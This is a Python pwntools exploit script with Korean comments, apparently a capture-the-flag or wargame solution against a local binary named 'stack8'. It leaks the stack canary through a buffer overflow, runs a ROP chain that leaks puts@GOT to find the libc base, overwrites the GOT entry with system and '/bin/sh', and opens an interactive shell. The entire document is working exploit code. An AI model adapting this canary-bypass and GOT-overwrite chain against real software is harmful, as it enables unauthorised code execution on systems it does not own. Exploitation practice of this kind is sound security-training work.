from pwn import *

p = process('./stack8')

read_plt = 0x401080
read_got = 0x404028
puts_plt = 0x401060
puts_got = 0x404018

pop_rdi_ret = 0x401263
pop_rsi_r15_ret = 0x401261
pop_rdx_ret = 0x40117e

# 1단계 카나리 유출

# 카나리 값 유출을 위해 (64 + 9 byte만큼) A 입력
# 카나리 직전까지 덮고 + 카나리 시작 널바이트도 덮음
payload = b'A' * 0x49 
p.send(payload) # 첫 번째 read에 send

p.recvn(0x49)
canary = u64(b'\x00' + p.recvn(7)) # 널바이트 이후부터 7바이트 받고 앞에 널 추가 (카나리값)
print('canary:', hex(canary))

# 2단계 ROP payload 구성 (두 번째 read)

# 72바이트 뒤에 카나리값 입력하면 카나리값 손실 안됨 (스택 정렬용)
payload = b'A' * 0x48 # buffer + 패딩
payload += p64(canary) # 카나리 복원
payload += b'A' * 0x8 # saved RBP

# ROP chain 시작
# puts_got 값(puts 함수의 실제 주소)를 통해 libc base 확인
# puts(puts@GOT) 호출
payload += p64(pop_rdi_ret)
payload += p64(puts_got)
payload += p64(puts_plt)

# read(0, puts_got, 0x10) 호출 -> puts_got에 system()함수 주소와, "/bin/sh"를 저장
# 첫 번째 인자 세팅 (rdi에 0)
payload += p64(pop_rdi_ret)
payload += p64(0x0)
# 두 번째 인자 세팅 (rsi에 puts_got)
payload += p64(pop_rsi_r15_ret)
payload += p64(puts_got)
payload += p64(0x0)
# 세 번째 인자 세팅 (rdx에 0x10)
payload += p64(pop_rdx_ret)
payload += p64(0x10)
payload += p64(read_plt) # read() 함수 실제 호출 (3번 째 send 위함)

# rdi에 puts_got + 0x8에 저장된 "/bin/sh" 넣고, ret로 puts_plt로 가면 puts_got로 이동하는데 puts_got에는 system주소가 있으므로 그거 실행
payload += p64(pop_rdi_ret)
payload += p64(puts_got + 0x8)
payload += p64(puts_plt)

p.recvline()    # canary 유출할 때 남은 개행 날리기
p.send(payload) # 두 번째 read에 send

# pust_libc 주소 기반으로 libc base 계산
puts_libc = u64(p.recvn(6) + b'\x00\x00')
print('puts_libc:', hex(puts_libc))
libc_base = puts_libc - 0x62420
system_libc = libc_base + 0x30290

# 이거는 실행시키기 위함이 아니라 puts_got에 넣기 위함 (정확히는 puts_got에 system 주소, puts_got + 0x8에 문자열 "/bin/sh")
payload = p64(system_libc) + b'/bin/sh\x00'
p.send(payload) # rop에서 호출한 read

p.interactive()